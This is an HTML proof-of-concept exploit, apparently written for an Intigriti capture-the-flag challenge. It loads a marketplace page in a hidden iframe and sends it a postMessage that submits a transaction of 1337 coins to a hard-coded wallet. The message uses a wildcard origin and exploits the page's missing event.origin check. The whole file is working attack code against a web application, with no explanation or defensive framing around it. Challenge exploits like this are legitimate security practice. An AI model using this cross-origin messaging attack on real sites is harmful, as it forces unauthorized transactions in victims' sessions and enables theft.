<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>postMessage Exploit PoC</title>
</head>
<body>
    <h1>Loadingâ€¦</h1>

    <!-- Victim page -->
    <iframe
        id="victim"
        src="https://challenge-0126.intigriti.io/marketplace.html?currency=1337COIN&price=1"
        style="display:none"
    ></iframe>

    <script>
        const iframe = document.getElementById('victim');

        iframe.onload = () => {
            const payload = {
                id: 1, // injected as requested
                type: 'submitTransaction',
                transaction: {
                    toAddress: "174094f246eb6712e885d470519c0ad4d4", // admin wallet
                    currency: "1337COIN",
                    amount: 1337
                }
            };

            // Exploit: receiver does NOT validate event.origin
            iframe.contentWindow.postMessage(payload, '*');
        };
    </script>
</body>
</html>
